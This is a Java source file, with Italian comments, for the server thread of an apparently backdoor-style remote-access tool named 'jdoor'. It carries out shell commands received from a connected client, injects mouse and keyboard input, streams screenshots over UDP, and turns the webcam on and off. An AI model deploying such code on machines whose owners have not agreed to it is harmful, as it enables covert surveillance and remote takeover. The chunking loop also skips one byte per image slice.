package com.jdoor.server;

import com.github.sarxos.webcam.Webcam;
import com.jdoor.Constants;
import com.jdoor.server.commands.CommandControllerThread;
import com.jdoor.server.keyboard.KeyboardController;
import com.jdoor.server.mouse.MouseController;
import com.jdoor.server.screen.ScreenCaptureThread;
import com.jdoor.server.webcam.WebcamCaptureThread;

import java.awt.*;
import java.io.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Arrays;

/**
 * Thread per gestire ogni client che si connette.
 */
public class ServerThread extends Thread {
    private Socket clientSocket;
    private final DatagramSocket datagramScreenSocket;
    private final DatagramSocket datagramWebcamSocket;
    private final InetAddress clientAddress;

    private final BufferedReader clientInput;
    private final BufferedWriter clientOutput;
    private boolean running;
    private boolean watching;


    /**
     * Costruttore del thread.
     * @param socket Il socket del client.
     * @throws IOException Se non si riesce ad aprire i canali di comunicazione fra client e server.
     */
    public ServerThread(Socket socket) throws IOException {
        clientSocket = socket;

        clientInput = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        clientOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

        datagramScreenSocket = new DatagramSocket();
        datagramWebcamSocket = new DatagramSocket();

        clientAddress = clientSocket.getInetAddress();
        running = true;
        watching = true;
    }

    /**
     * Metodo per mandare uno screenshot al client.
     * Verrà chiamato solo da ScreenCaptureThread, NON VA CHIAMATO da nessun'altra parte.
     * @param buffer L'array di bytes che viene mandato al client che rappresenta l'immagine.
     */
    public void sendStream(byte[] buffer, DatagramSocket socket, int port) {
        // Vedere quanti pacchetti servono per mandare l'immagine.
        // Visto che le immagini sono molto grandi e che un pacchetto UDP può essere massimo circa
        // 64kb, lo dividiamo in pacchetti di massimo 62kb per essere sicuri.
        // In ogni pacchetto mettiamo un pezzo d'immagine, lo spediamo e lasciamo che il client o ricomponga.
        // Arrotondiamo per eccesso in modo da mandare anche un pacchetto con pochissimi dati
        // ma almeno possiamo così assicurarci che l'immagine intera arrivi.
        int packets = (int) Math.ceil((float) buffer.length / Constants.IMAGE_BYTES_DIMENSION);
        int bufIndex = 0;

        // Mandare tanti pacchetti quanti c'è ne è bisogno.
        for (int i = 0; i < packets; i++) {
            //System.out.println("bufIndex: " + bufIndex);
            // Ottenere un pezzo dell'immagine.
            byte[] imageSlice = Arrays.copyOfRange(buffer, bufIndex, bufIndex + Constants.IMAGE_BYTES_DIMENSION);
            //System.out.println("Slice è " + imageSlice.length + " di " + buffer.length);

            // Creare pacchetto UDP e mandarlo.
            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, port);
            try {
                socket.send(datagramPacket);
                //System.out.println(clientSocket + ": Sent screen");
            } catch (IOException e) {
                e.printStackTrace();
            }
            // Andare al prossimo pezzo d'immagine.
            bufIndex += Constants.IMAGE_BYTES_DIMENSION + 1;
        }

        // Creare il pacchetto che indica che si è giunti al termine dell'immagine e spedirlo.
        byte[] endPkt = {'E', 'N', 'D'};
        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, port);
        try {
            socket.send(datagramPacket);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public DatagramSocket getDatagramScreenSocket() {
        return datagramScreenSocket;
    }

    public DatagramSocket getDatagramWebcamSocket() {
        return datagramWebcamSocket;
    }

    /**
     * Metodo per vedere se il thread ha finito l'esecuzione.
     * @return true se il thread ha finito l'esecuzione, fase se no.
     */
    public boolean isClosed() {
        return clientSocket == null;
    }

    /**
     * Metodo per vedere se il client sta guardando lo schermo del server.
     * @return true se il client sta guardando lo schermo, false se no.
     */
    public boolean isWatching() {
        return watching;
    }

    /**
     * Metodo principale per l'esecuzione dei comandi del client.
     */
    @Override
    public void run() {
        String command;
        try {
            while (running) {
                // Ottenere comando.
                command = clientInput.readLine();
                System.out.println("Command: " + command);

                if(command == null) {
                    command = "S";
                }

                switch (command.charAt(0)) {
                    // Il client ha premuto il mouse da qualche parte.
                    case 'M':
                        MouseController.getInstance().clickMouse(command);
                        break;

                    // Il client si è disconnesso.
                    case 'S':
                        running = false;
                        continue;

                    // Il client ha mandato un comando da eseguire in shell.
                    case 'C':
                        CommandControllerThread cct = new CommandControllerThread(clientOutput, command);
                        cct.start();
                        break;

                    // Il client ha richiesto la grandezza dello schermo.
                    case 'R':
                        clientOutput.write(ScreenCaptureThread.SCREEN_SIZE + "\n");
                        clientOutput.flush();
                        break;

                    // Il client ha premuto un tasto sulla tastiera.
                    case 'K':
                        KeyboardController.getInstance().pressKeyboard(command);
                        break;

                    // Il client ha smesso oppure ha ripreso a guardare lo schermo del
                    // server riducendo oppure riaprendo la finestra.
                    case 'L':
                        watching = !watching;
                        break;


                    // Il comando non è stato riconosciuto, mostriamo un errore.
                    case 'W':
                        Webcam webcam = WebcamCaptureThread.getWebcamCaptureThread().getWebcam();
                        switch (command.charAt(1)) {
                            case 'O':
                                if(!webcam.isOpen())
                                   webcam.open();
                                break;
                            case 'C':
                                if(webcam.isOpen())
                                    webcam.close();
                                break;
                        }
                        break;

                    default:
                        System.out.println("Errore comando non riconosciuto: " + command);
                        clientOutput.write("Unknown command: " + command + "\n");
                        clientOutput.flush();
                        break;
                }
            }
            clientSocket.close();
            clientSocket = null; // Indica che il client socket è stato chiuso.
        } catch (IOException | AWTException e) {
            System.out.println("Error while closing socket: " + e.getMessage());
        }
    }
}
